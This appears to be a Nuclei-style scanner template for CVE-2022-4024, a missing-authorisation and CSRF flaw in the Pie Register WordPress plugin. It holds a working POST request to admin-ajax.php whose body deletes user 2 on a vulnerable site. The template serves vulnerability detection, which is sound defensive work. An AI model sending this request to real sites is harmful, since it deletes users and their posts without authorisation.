id: CVE-2022-4024

info:
  name: Unauthenticated Arbitrary User Deletion in Pie Register Plugin
  author: ProjectDiscoveryAI
  severity: medium
  description: The Registration Forms WordPress plugin before 3.8.1.3 does not have authorisation and CSRF when deleting users via an init action handler, allowing unauthenticated attackers to delete arbitrary users (along with their posts).
  impact: |
    An attacker can delete arbitrary users without authentication.
  remediation: |
    Update Pie Register Plugin to the latest version to mitigate CVE-2022-4024.
  reference: |-
    https://wpscan.com/vulnerability/a087fb45-6f6c-40ac-b48b-2cbceda86cbe
    https://github.com/cyllective/CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2022-4024
    cwe-id: CWE-352
    epss-score: 0.00093
    epss-percentile: 0.41236
    cpe: cpe:2.3:a:genetechsolutions:pie_register:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: genetechsolutions
    product: pie_register
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: "vdeleteit=1&vusers[]=2"

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: status
        status:
          - 200
